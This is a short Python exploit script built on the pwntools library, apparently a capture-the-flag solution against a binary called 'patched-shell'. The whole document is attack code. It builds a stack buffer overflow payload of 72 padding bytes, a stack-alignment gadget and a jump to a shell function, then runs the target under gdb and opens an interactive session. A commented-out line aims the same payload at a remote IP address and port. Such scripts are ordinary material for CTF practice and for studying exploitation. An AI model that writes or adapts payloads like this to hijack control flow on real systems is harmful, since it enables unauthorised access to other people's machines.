from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./patched-shell")
#p = remote("34.134.173.142", 5000)
p = gdb.debug("./patched-shell", '''
b *main+31''')

shell = p64(0x401136)
add_rsp_8 = p64(0x401170)

payload = b""
payload += b"A" * 72
payload += add_rsp_8
payload += shell

p.sendline(payload)
p.interactive()
